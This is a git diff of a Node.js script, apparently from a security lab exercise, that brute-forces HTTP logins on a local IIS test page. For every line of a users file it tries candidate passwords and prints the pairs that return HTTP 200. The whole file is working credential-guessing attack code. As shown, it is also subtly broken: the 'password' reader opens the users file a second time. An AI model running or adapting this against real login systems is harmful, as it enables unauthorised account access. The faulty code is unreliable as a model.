@@ -1,10 +1,23 @@
 "use strict";
 
 const request = require("request");
-const {users} = require("./users.json");
-const {passwords} = require("./dictionnaire.json");
+const readline = require("readline");
+const fs = require("fs");
 
-testUsersAndPassword("http://127.0.0.1/securityModel3IL/Scripts/bruteForceIIS/test/", users, passwords);
+const usersReader = readline.createInterface({
+    input: fs.createReadStream("users.txt")
+});
+let passwordReader;
+usersReader.on("line", user => {
+    passwordReader = readline.createInterface({
+        input: fs.createReadStream("users.txt")
+    });
+    passwordReader.on("line", password => {
+        sendREquest("http://127.0.0.1/securityModel3IL/Scripts/bruteForceIIS/test/", user, password)
+            .then(() => console.log(`${user} => ${password}`))
+            .catch(() => {});
+    });
+});
 
 function sendREquest(url, username, password) {
     return new Promise((resolve, reject) => {
@@ -16,30 +29,10 @@ function sendREquest(url, username, password) {
             }
         }).on("response", (response) => {
             if (response.statusCode === 200) {
-                resolve(true);
+                resolve();
             } else {
-                resolve(false);
+                reject();
             }
         })
     });
-}
-
-function testPassword(url, username, passwords) {
-    return new Promise((resolve, reject) => {
-        for (const password of passwords) {
-            sendREquest(url, username, password).then(responseStatus => {
-                if (responseStatus) {
-                    console.log(`${username} => ${password}`);
-                    resolve(true);
-                }
-            });
-        }
-        resolve(false);
-    });
-}
-
-function testUsersAndPassword(url, users, passwords) {
-    for (const user of users) {
-        testPassword(url, user, passwords);
-    }
 }
